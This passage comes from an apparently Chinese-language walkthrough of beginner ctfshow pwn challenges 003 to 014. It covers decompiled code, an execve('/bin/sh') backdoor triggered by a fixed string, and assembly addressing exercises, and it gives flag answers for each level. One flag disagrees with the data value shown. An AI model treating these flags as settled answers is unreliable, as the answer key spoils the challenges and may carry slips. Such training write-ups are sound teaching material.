amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位程序保护全开</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 变量定义</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v3; <span class="comment">// rdx   指针变量v3</span></span><br><span class="line">  <span class="type">char</span> argva[<span class="number">12</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF  12位的字符数组</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;argva[<span class="number">4</span>] = __readfsqword(<span class="number">0x28</span>u);  <span class="comment">// 这行代码读取了线程信息块(TIB)中的某个地址（通常是栈基址），并将该值存储到argva数组的某个位置</span></span><br><span class="line">  </span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);  <span class="comment">// 调用了setvbuf来改变缓冲区行为，与之前的代码一致，分别为_BSS段和标准输入stdin设置无缓冲I/O</span></span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">  logo();  <span class="comment">// 美术部分</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] level up ! Let&#x27;s go ! &quot;</span>);</span><br><span class="line">  menu();  <span class="comment">// 就是上面的选项列表</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your choice is :\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, argva);  <span class="comment">// 使用__isoc99_scanf函数从标准输入读取一个整数到argva数组中，作为用户的选择</span></span><br><span class="line">  <span class="keyword">switch</span> ( *(_DWORD *)argva )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;start&quot;</span>);  <span class="comment">// 一眼假</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      main((<span class="type">int</span>)<span class="string">&quot;%d&quot;</span>, (<span class="type">const</span> <span class="type">char</span> **)argva, v3);  <span class="comment">// ai说是递归调用main函数</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Hello CTFshow&quot;</span>);    <span class="comment">// 一眼假</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      ctfshow();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>);    <span class="comment">// 一眼假</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      system_func();  <span class="comment">// 看看这个函数有没有执行</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>);    <span class="comment">// 一眼假</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);    <span class="comment">// 一眼假</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid input&quot;</span>);    <span class="comment">// 一眼假</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"> <span class="type">int</span> <span class="title function_">system_func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;  <span class="comment">// 看来确实执行了</span></span><br><span class="line"></span><br><span class="line"> <span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo /ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;  <span class="comment">// 执行了，但是只有打印，一眼假</span></span><br></pre></td></tr></table></figure></div><h3 id="004-看C代码"><a class="header-anchor" href="#004-看C代码">¶</a>004 看C代码</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn004/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位保护全开</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 变量定义</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">11</span>]; <span class="comment">// [rsp+1h] [rbp-1Fh] BYREF  // 用于存储字符串&quot;CTFshowPWN&quot;</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">12</span>]; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF  // 用于接收用户输入</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]  // 用于存储从FS段读取的信息，可能与栈保护或调试相关</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);  <span class="comment">// 读取FS段寄存器的值</span></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);  </span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);  <span class="comment">// 通过两次setvbuf调用，禁用了_BSS段和标准输入stdin的缓冲</span></span><br><span class="line">  <span class="built_in">strcpy</span>(s1, <span class="string">&quot;CTFshowPWN&quot;</span>);  <span class="comment">// 字符串&quot;CTFshowPWN&quot;复制到s1数组</span></span><br><span class="line">  logo();  <span class="comment">// 美术</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;find the secret !&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s2);  <span class="comment">// 通过scanf函数等待用户输入一个字符串，并将其保存到s2数组中。注意，直接使用%s格式化字符串而不指定最大长度可能会导致缓冲区溢出的安全风险</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">    execve_func();  <span class="comment">// s1 s2相同就执行</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">execve_func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *argv[<span class="number">3</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF  读取了线程信息块中的某个值，可能用于检测堆栈是否被修改，确保安全</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]  // 用于存储FS段的原始值，可能用于安全检查或调试</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);  <span class="comment">// 读取了线程信息块中的某个值，可能用于检测堆栈是否被修改，确保安全</span></span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;  <span class="comment">// shell自身的名称</span></span><br><span class="line">  argv[<span class="number">1</span>] = <span class="number">0LL</span>;  <span class="comment">// 参数结束标志</span></span><br><span class="line">  argv[<span class="number">2</span>] = <span class="number">0LL</span>; <span class="comment">// 多余的，因为在argv[1]后已经结束</span></span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, <span class="number">0LL</span>);  <span class="comment">// 使用execve系统调用来启动一个新的程序，替换当前进程的内存空间。在这里，它启动的是Shell (/bin/sh)，并且传入了预先准备好的参数列表argv。第三个参数为0LL，意味着环境变量列表为空</span></span><br><span class="line"> <span class="comment">// 第一个参数是指向可执行文件路径的字符串，指向Shell程序</span></span><br><span class="line"> <span class="comment">// 第三个参数0LL，即(char*)NULL，意味着不传递任何环境变量给新进程</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><p><code>execve</code> 本身并不是一个后门函数。实际上， <code>execve</code> 是一个标准的系统调用函数，用于在 Linux和类 Unix 系统中执行一个新的程序。它的原型如下：<br><code>int execve(const char *filename, char *const argv[], char *const envp[]);</code><br>该函数接受三个参数：</p><ul><li>filename ：要执行的程序的文件名或路径。</li><li>argv ：一个以 NULL 结尾的字符串数组，表示传递给新程序的命令行参数。</li><li>envp ：一个以 NULL 结尾的字符串数组，表示新程序的环境变量。</li><li>当调用 execve 函数时，它会将当前进程替换为新程序的代码，并开始执行新程序。新程序接收argv 和 envp 作为命令行参数和环境变量。</li><li>在加入某些参数后就可以达到我们所需要的后门函数的效果</li></ul></li><li><p>这道题就是输入<code>CTFshowPWN</code>字符串，即可获得shell，然后<code>cat /ctfshow_flag</code></p></li></ul><h3 id="005-012-了解寄存器、寻址方式’"><a class="header-anchor" href="#005-012-了解寄存器、寻址方式’">¶</a>005-012 了解寄存器、寻址方式’</h3><h4 id="汇编代码"><a class="header-anchor" href="#汇编代码">¶</a>汇编代码</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">section .data</span><br><span class="line">	msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0</span><br><span class="line">section .text</span><br><span class="line">	global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11 ; 将11赋值给eax</span><br><span class="line">    add eax, 114504 ; eax加上114504</span><br><span class="line">    sub eax, 1 ; eax减去1</span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx ; 将ebx的值赋值给edx</span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, [msg] ; 将msg的地址赋值给ecx	</span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi] ; 将esi所指向的地址的值赋值给eax</span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4 ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx] ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2 ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2] ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1 ; 将1赋值给edx</span><br><span class="line">    add ecx, 8 ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6] ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4 ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1 ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22 ; 要输出的字符串的长度</span><br><span class="line">    int 0x80 ; 调用系统调用</span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1 ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx ; 返回值为0</span><br><span class="line">    int 0x80 ; 调用系统调用</span><br></pre></td></tr></table></figure></div><ul><li><p>使用NASM汇编器和ld链接器将汇编代码编译成可执行文件</p></li><li><p>首先，将代码保存为一个文件，例如 Welcome_CTFshow.asm 。然后，使用以下命令将其编译为对象文件↓↓↓</p></li><li><p><code>nasm -f elf Welcome_to_CTFshow.asm</code></p><ul><li>这将生成一个名为 <code>Welcome_CTFshow.o</code> 的对象文件。接下来，使用以下命令将对象文件链接成可执行文件</li><li><code>ld -m elf_i386 -s -o Welcome_to_CTFshow Welcome_to_CTFshow.o</code><ul><li>这将生成一个名为 Welcome_CTFshow 的可执行文件</li></ul></li></ul></li><li><p>用64位IDA打开<code>Welcome_to_CTFshow.o</code>，即可获得以上汇编代码</p></li><li><p>好抽象啊啊啊啊啊啊啊啊啊啊</p></li></ul><h4 id="005-运行可执行文件"><a class="header-anchor" href="#005-运行可执行文件">¶</a>005 运行可执行文件</h4><p><code>./Welcome_to_CTFshow</code></p><p>得到：<code>Welcome_to_CTFshow_PWN</code></p><ul><li><code>ctfshow&#123;Welcome_to_CTFshow_PWN&#125;</code></li></ul><h4 id="006-立即寻址方式"><a class="header-anchor" href="#006-立即寻址方式">¶</a>006 立即寻址方式</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11 ; 将11赋值给eax</span><br><span class="line">    add eax, 114504 ; eax加上114504</span><br><span class="line">    sub eax, 1 ; eax减去1</span><br></pre></td></tr></table></figure></div><ul><li><code>ctfshow&#123;114514&#125;</code> （好臭啊</li></ul><h4 id="007-寄存器寻址方式"><a class="header-anchor" href="#007-寄存器寻址方式">¶</a>007 寄存器寻址方式</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx ; 将ebx的值赋值给edx</span><br></pre></td></tr></table></figure></div><ul><li><code>ctfshow&#123;0x36D&#125;</code></li></ul><h4 id="008-直接寻址方式"><a class="header-anchor" href="#008-直接寻址方式">¶</a>008 直接寻址方式</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; 直接寻址方式</span><br><span class="line">	mov ecx, [msg] ; 将msg的地址赋值给ecx</span><br><span class="line">对应IDA：</span><br><span class="line">	mov ecx, dword_80490E8</span><br></pre></td></tr></table></figure></div><ul><li><code>ctfshow&#123;0x80490E8&#125;</code></li></ul><h4 id="009-寄存器间接寻址方式"><a class="header-anchor" href="#009-寄存器间接寻址方式">¶</a>009 寄存器间接寻址方式</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi] ; 将esi所指向的地址的值赋值给eax</span><br><span class="line">对应IDA：</span><br><span class="line">	mov esi, offset dword_80490E8</span><br><span class="line">	mov eax, [esi]</span><br><span class="line"></span><br><span class="line">.data:080490E8 dword_80490E8 dd 696C6557h		; DATA XREF: LOAD:0804805C↑o</span><br></pre></td></tr></table></figure></div><ul><li><code>ctfshow&#123;0x636C6557&#125;</code></li></ul><h4 id="010-寄存器相对寻址方式"><a class="header-anchor" href="#010-寄存器相对寻址方式">¶</a>010 寄存器相对寻址方式</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4 ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx] ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line">对应IDA：</span><br><span class="line">	mov ecx, offset dword_80490E8</span><br><span class="line">	add ecx, 4</span><br><span class="line">	mov eax, [ecx]</span><br><span class="line">	</span><br><span class="line">.data:080490E8 dword_80490E8 dd 696C6557h		; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490EC aOmeToCtfshowPw db &#x27;ome_to_CTFshow_PWN&#x27;, 0</span><br></pre></td></tr></table></figure></div><ul><li><p>这里将msg的地址（0x80490E8）+ 4 处所执向的地址的值赋给eax</p></li><li><p><code>hex(0x80490E8+4)</code> 得到<code>0x80490ec</code> 也就是<code>“ome_to_CTFshow_PWN”</code></p></li><li><p><code>ctfshow&#123;ome_to_CTFshow_PWN&#125;</code></p></li></ul><h4 id="011-基址变址寻址方式"><a class="header-anchor" href="#011-基址变址寻址方式">¶</a>011 基址变址寻址方式</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2 ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2] ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line">对应IDA：</span><br><span class="line">	mov ecx, offset dword_80490E8</span><br><span class="line">	add edx, 2</span><br><span class="line">	mov eax, [ecx + edx * 2]</span><br><span class="line">	</span><br><span class="line">.data:080490E8 dword_80490E8 dd 696C6557h		; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490EC aOmeToCtfshowPw db &#x27;ome_to_CTFshow_PWN&#x27;, 0</span><br></pre></td></tr></table></figure></div><ul><li>计算最终也是 [0x80490E8 + 2*2 ] = [0X80490EC]</li><li><code>ctfshow&#123;ome_to_CTFshow_PWN&#125;</code></li></ul><h4 id="012-相对基址变址寻址"><a class="header-anchor" href="#012-相对基址变址寻址">¶</a>012 相对基址变址寻址</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1 ; 将1赋值给edx</span><br><span class="line">    add ecx, 8 ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6] ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line">    </span><br><span class="line">对应IDA：</span><br><span class="line">	mov ecx, offset dword_80490E8</span><br><span class="line">	add edx, 2</span><br><span class="line">	mov eax, [ecx + edx * 2]</span><br><span class="line">	</span><br><span class="line">.data:080490E8 dword_80490E8 dd 696C6557h		; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490EC aOmeToCtfshowPw db &#x27;ome_to_CTFshow_PWN&#x27;, 0</span><br></pre></td></tr></table></figure></div><ul><li><p><code>hex(8 + 0x80490E8 + 1*2 -6)</code> 得到<code>0x80490ec</code> 也就是<code>“ome_to_CTFshow_PWN”</code></p></li><li><p><code>ctfshow&#123;ome_to_CTFshow_PWN&#125;</code></p></li></ul><h3 id="013-gcc编译"><a class="header-anchor" href="#013-gcc编译">¶</a>013 gcc编译</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat flag.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> flag[] = &#123;<span class="number">99</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">104</span>, <span class="number">79</span>, <span class="number">119</span>, <span class="number">95</span>, <span class="number">116</span>, <span class="number">48</span>, <span class="number">95</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">51</span>, <span class="number">95</span>, <span class="number">71</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">63</span>, <span class="number">125</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><p>它使用字符数组 flag 存储了一个加密的字符串，并通过 printf函数将其打印出来</p></li><li><p>在这段代码中， flag 数组存储了一串整数值，这些整数值代表了字符的 ASCII 码。通过将这些整数值转换为相应的字符，就可以还原出原始的字符串</p></li><li><p>运行该程序， printf 函数使用 %s 格式字符串将 flag 数组作为参数进行打印。由于 flag 数组的最后一个元素为零（NULL 字符），printf 函数会将其之前的字符依次打印，直到遇到 NULL 字符为止。</p></li><li><p>根据给定的整数值数组，还原出的字符串为： <code>ctfshow&#123;hOw_t0_us3_GCC?&#125;</code></p></li></ul><h3 id="014-gcc编译-c文件"><a class="header-anchor" href="#014-gcc编译-c文件">¶</a>014 gcc编译.c文件</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 1024  </span></span><br><span class="line"><span class="comment">// 定义了缓冲区的大小为1024字节，用于读取文件内容</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">    <span class="type">size_t</span> n;</span><br><span class="line">    </span><br><span class="line">    fp = fopen(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;rb&quot;</span>);  <span class="comment">// 尝试以二进制只读模式(&quot;rb&quot;)打开名为&quot;key&quot;的文件</span></span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Nothing here!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> output[BUFFER_SIZE * <span class="number">9</span> + <span class="number">12</span>];  <span class="comment">// 输出字符串output的大小预留得比原始缓冲区大得多，以容纳转换后的位表示及额外的格式化字符</span></span><br><span class="line">    <span class="type">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">&quot;ctfshow&#123;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((n = 